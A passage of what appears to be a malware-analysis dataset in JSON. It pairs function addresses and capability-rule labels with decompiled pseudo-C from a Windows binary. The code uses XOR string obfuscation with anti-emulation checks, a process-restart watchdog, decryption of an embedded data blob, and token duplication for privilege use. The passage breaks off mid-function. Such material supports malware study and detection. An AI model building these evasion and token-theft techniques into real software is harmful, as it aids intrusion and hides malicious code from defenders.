        "decompiled_code": "\nuint __fastcall fcn.0040a717(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, L\"%s --\", *0x41daac);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 360
    },
    "0040a794": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a794(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpDst;\n    uint lpProcessAttributes;\n    uint *var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 0x426a415f;\n    iVar5 = 0x44;\n    var_48h = 0x4109540e;\n    puVar6 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_44h = 0x5412424d;\n    var_40h = 0x426b4117;\n    puVar6 = &lpProcessAttributes;\n    var_54h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    lpProcessAttributes = 0x44;\n    var_3ch = 0x41155418;\n    puVar6 = &lpDst;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_38h = 0x5452424d;\n    var_34h = 0x424a4126;\n    var_30h = 0x4109540e;\n    var_2ch = 0x5412424d;\n    var_28h = 0x420a4117;\n    var_24h = 0x41265445;\n    var_20h = 0x5401424a;\n    var_1ch = 0x42514119;\n    var_18h = 0x41095418;\n    var_14h = 0x5459424d;\n    var_10h = 0x4241411f;\n    var_ch = 0x417a5412;\n    var_8h = 0x4239417a;\n    var_4h._0_2_ = 0x5477;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x89);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar2 != 0x6decaa) {\n            var_50h = 6;\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % 6) ^ (iVar5 + iVar4)[&var_4ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpDst, 0x104);\n    puVar6 = var_54h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, *0x41daac, 0, 0, 0, 0x800000c, 0, 0, &lpProcessAttributes, var_54h);\n    if (puVar6[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar6[1]);\n    }\n    uVar1 = *puVar6;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 1026
    },
    "0040a8fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a8fe(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_324h;\n    uint var_11ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar9 = &var_11ch;\n    for (iVar7 = 0x104; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_324h;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    if (*0x41dadc == 0) {\n        uVar6 = 0;\n        do {\n            if (*(uVar6 + 0x4113a0) == arg_ch) {\n                if (arg_10h == *0x41dab4) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar9 = &var_11ch;\n                    for (iVar7 = 0x104; iVar7 != 0; iVar7 = iVar7 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    var_11ch._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar7 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar7 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar7, &var_11ch, 0x104);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n                    }\n                    pcVar5 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_11ch);\n                    if (iVar7 != 0) {\n                        (*pcVar5)(&var_11ch);\n                        iVar7 = fcn.00401b49();\n                        if (iVar7 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar7 = fcn.0040d530();\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                puVar9 = &var_324h;\n                for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                iVar7 = fcn.0040ae4d();\n                if (iVar7 == 0) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_324h, 0x41dbc0);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040b235, arg_10h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                return 1;\n            }\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x1c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar7 = fcn.0040d530(),  iVar7 == 0)) && (iVar7 = fcn.0040ae4d(),  iVar7 != 0)\n             ) && (iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_324h),  iVar1 == 0)) {\n        var_18h = 0x1622330d;\n        var_14h = 0x62650a26;\n        var_10h = 0x3a0a2756;\n        var_ch._0_1_ = 0x50;\n        var_8h = 0x78505666;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x43);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar3 != 0xba32d9) {\n                *(iVar8 + iVar7) = *(&var_8h + iVar8 % 5) ^ (iVar8 + iVar7)[&var_18h - iVar7];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0xd);\n        var_14h = 0x28203d2c;\n        var_10h = 0xe001a3a;\n        var_ch._0_1_ = 0x44;\n        var_8h = 0x6944596d;\n        var_4h._0_2_ = 0x754e;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar3 = 0;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar4 != 0x373a6) {\n                *(iVar3 + iVar8) = *(&var_8h + iVar3 % 6) ^ (iVar3 + iVar8)[&var_14h - iVar8];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 9);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar7, iVar8);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        (*pcVar5)(&var_324h);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *(iVar3 + 8) = arg_10h;\n        uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040d74a, iVar3, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar5)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1714
    },
    "0040abd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040abd5(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41dadc == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41daa4, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41dbc0;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.0040ae4d();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040c904, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        str.bIG0iEw66qDx[uVar5 + 0xc] = str.bIG0iEw66qDx[uVar5 + 0xc] ^ \"2VVq3q8Oy\"[uVar5 % 9];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x417890) = *(uVar5 + 0x417890) ^ str.bIG0iEw66qDx[uVar5 % 0xc];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040d584, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41ddd0 == 0) {\n        fcn.00403c4c();\n        if (*0x41dadc != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 693
    },
    "0040ae4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040ae4d(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint ARG_0;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t ProcessHandle;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *dwProcessId;\n    uint var_18h;\n    uchar *var_14h;\n    int32_t var_10h;\n    uchar *var_ch;\n    uint TokenInformationLength;\n    int32_t TokenHandle;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_3ch = 0x104;\n    var_14h = puVar2;\n    uVar1 = (*pcVar6)(8, 0x208);\n    var_ch = (*pcVar7)(uVar1);\n    TokenInformationLength = 0;\n    var_38h = 0x104;\n    var_30h = 0;\n    uVar1 = 0;\n    if ((puVar2 != NULL) && (var_ch != NULL)) {\n        ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (ProcessHandle != 0) {\n            var_6ch = 0x3a614737;\n            var_68h = 0x79142431;\n            var_64h = 0x243b295e;\n            for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar2 = 0;\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = var_ch;\n            for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar2 = 0;\n                puVar2 = puVar2 + 1;\n            }\n            var_60h = 0x26445100;\n            var_5ch = 0x5f39383b;\n            var_58h._0_2_ = 0x2a5b;\n            var_58h._2_1_ = 0x3a;\n            var_58h._3_1_ = 0x56;\n            var_4ch = 0x4f30306d;\n            var_48h._0_2_ = 0x5654;\n            uVar1 = (*pcVar6)(8, 0x19);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            var_20h = 6;\n            iVar5 = 0;\n            var_10h = &var_6ch - iVar4;\n            var_24h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar3 != 0xbb831d) {\n                    *(iVar5 + iVar4) = *(&var_4ch + iVar5 % var_20h) ^ (iVar5 + iVar4)[var_10h];\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 0x18);\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap,  TokenHandle == 0)) {\n                var_60h = 0x1622330d;\n                var_5ch = 0x62650a26;\n                var_58h._0_2_ = 0x2756;\n                var_58h._2_1_ = 10;\n                var_58h._3_1_ = 0x3a;\n                var_54h._0_1_ = 0x50;\n                var_4ch = 0x78505666;\n                var_48h._0_2_ = CONCAT11(var_48h._1_1_, 0x43);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                var_10h = 5;\n                iVar4 = 0;\n                var_34h = &var_60h - iVar5;\n                var_20h = iVar5;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                    if (iVar3 != 0xba32d9) {\n                        *(iVar4 + iVar5) = *(&var_4ch + iVar4 % var_10h) ^ (iVar4 + iVar5)[&var_60h - iVar5];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0xd);\n                var_40h = fcn.0040d447();\n                pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (var_40h != 0) {\n                    var_60h = 0x221c5c22;\n                    var_5ch = 0x3f59154c;\n                    var_58h._0_2_ = 0x5c23;\n                    var_58h._2_1_ = 6;\n                    var_58h._3_1_ = 0x4c;\n                    var_54h._0_1_ = 0x6e;\n                    dwProcessId = 0x566e3574;\n                    var_18h._0_1_ = 0x39;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar5 = 0;\n                    var_4ch = iVar4;\n                    var_34h = &var_60h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                        if (iVar3 != 0xea7637) {\n                            *(iVar5 + iVar4) = *(&dwProcessId + iVar5 % var_10h) ^ (iVar5 + iVar4)[&var_60h - iVar4];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0xd);\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &TokenInformationLength);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar5 = var_20h;\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (iVar3 == 0x7a) {\n                        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                        if (dwProcessId != NULL) {\n                            iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                              (TokenHandle, 1, dwProcessId, TokenInformationLength, \n                                               &TokenInformationLength);\n                            if (iVar3 != 0) {\n                                iVar3 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_14h, &var_3ch, var_ch, &var_38h, &var_50h);\n                                if (iVar3 != 0) {\n                                    var_78h = 0x422f6c15;\n                                    var_74h = 0x6a3f4611;\n                                    var_70h = 0x6c09420b;\n                                    var_6ch = 0x46784224;\n                                    var_68h = 0x421e6a30;\n                                    var_64h = 0x42196c63;\n                                    var_60h = 0x6a49461e;\n                                    var_5ch = 0x6c1a4231;\n                                    var_58h._0_2_ = 0x424f;\n                                    var_58h._2_1_ = 0x26;\n                                    var_58h._3_1_ = 0x46;\n                                    var_54h._0_1_ = 0x6c;\n                                    var_54h._1_1_ = 0x6a;\n                                    var_30h = 0x426a6c46;\n                                    var_2ch._0_1_ = 0x42;\n                                    uVar1 = (*pcVar6)(8, 0x4d);\n                                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                                    iVar5 = 0;\n                                    var_34h = &var_78h - iVar4;\n                                    do {\n                                        iVar3 = (*_sym.imp.USER32.dll_GetFocus)();\n                                        if (iVar3 != 0x32f8f0) {\n                                            *(iVar5 + iVar4) =\n                                                 *(&var_30h + iVar5 % var_10h) ^ (iVar5 + iVar4)[&var_78h - iVar4];\n                                        }\n                                        iVar5 = iVar5 + 1;\n                                    } while (iVar5 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar4, var_ch, var_14h, var_40h);\n                                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_30h = 1;\n                                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                                    iVar5 = var_20h;\n                                    iVar4 = var_4ch;\n                                }\n                            }\n                            uVar1 = (*pcVar6)(0, dwProcessId);\n                            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                        }\n                    }\n                    uVar1 = (*pcVar6)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                iVar4 = var_24h;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                uVar1 = (*pcVar6)(0, iVar5);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n            uVar1 = (*pcVar6)(0, iVar4);\n            (*pcVar7)(uVar1);\n            puVar2 = var_14h;\n        }\n        uVar1 = (*pcVar6)(0, var_ch);\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar6)(0, puVar2);\n        (*pcVar7)(uVar1);\n        uVar1 = var_30h;\n    }\n    return uVar1;\n}\n",
        "token_count": 2721
    },
    "0040c904": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c904(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t uStack564;\n    int32_t iStack552;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack576 = 0;\n    iStack580 = 0;\n    puVar10 = auStack544;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar11 = &uStack568;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    piVar9 = &iStack528;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    if (*0x41dadc == 0) {\n        *0x41dbb8 = fcn.0040a794();\n        uVar6 = *0x41ddcc;\n        iVar8 = *0x41ddc8;\n    }\n    else {\n        *0x41dbb8 = fcn.0040a096();\n        iVar5 = fcn.00401397(&iStack580);\n        uVar6 = uStack576;\n        iVar8 = iStack580;\n        if (iVar5 != 0) goto code_r0x0040c9bd;\n    }\n    uStack564 = uVar6 >> 0x1f;\n    uStack568 = uVar6;\n    iStack552 = iVar8;\ncode_r0x0040c9bd:\n    iVar8 = iStack552;\n    uVar3 = uStack564;\n    uVar6 = uStack568;\n    if (*0x41dbb8 == 0) {\n        piVar9 = &iStack528;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        if (piVar9 - auStack526 >> 1 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar4);\n        }\n    }\n    else {\n        fcn.0040ae4d();\n        if ((iVar8 != 0) && ((uVar6 | uVar3) != 0)) {\n            fcn.00409a7f();\n            fcn.00407051((*0x41dad8 & 1) << 4);\n        }\n        uStack576 = *0x41dbb8;\n        uStack572 = *0x41daa4;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack576, 0, 0xffffffff);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(5000);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar7);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41dbb8, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040c904, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n        (*pcVar2)(*0x41dbb8);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 990
    },
    "0040cdb5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040cdb5(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t *piVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint lpApplicationName;\n    uint var_d0h;\n    int32_t var_c8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    int32_t var_70h;\n    uint pSessionId;\n    uint dwProcessId;\n    int32_t *var_64h;\n    uint hExistingToken;\n    uint pSid;\n    uint var_58h;\n    uint var_54h;\n    uint pIdentifierAuthority;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t lpMem;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint phNewToken;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch._0_2_ = 0x1000;\n    piVar7 = param_2;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *piVar7 = 0;\n        piVar7 = piVar7 + 1;\n    }\n    pSessionId = 0;\n    puVar8 = &var_d0h;\n    dwProcessId = param_1;\n    var_64h = param_2;\n    for (iVar5 = 0x44; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_2ch = 0;\n    puVar8 = &var_84h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    phNewToken = 0;\n    hExistingToken = 0;\n    var_38h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (ProcessHandle != 0) {\n        var_10h = 0x1622330d;\n        var_ch = 0x62650a26;\n        var_8h = 0x3a0a2756;\n        var_4h._0_1_ = 0x50;\n        lpMem = 0x78505666;\n        var_30h._0_1_ = 0x43;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_70h = 5;\n        iVar9 = 0;\n        var_7ch = iVar5;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar3 != 0xba32d9) {\n                *(iVar9 + iVar5) = *(&lpMem + iVar9 % var_70h) ^ (iVar9 + iVar5)[&var_10h - iVar5];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0xd);\n        iVar9 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar9 != 0) {\n            iVar9 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar9 != 0) {\n                fcn.0040b30d();\n                iVar3 = 0;\n                iVar9 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &phNewToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if 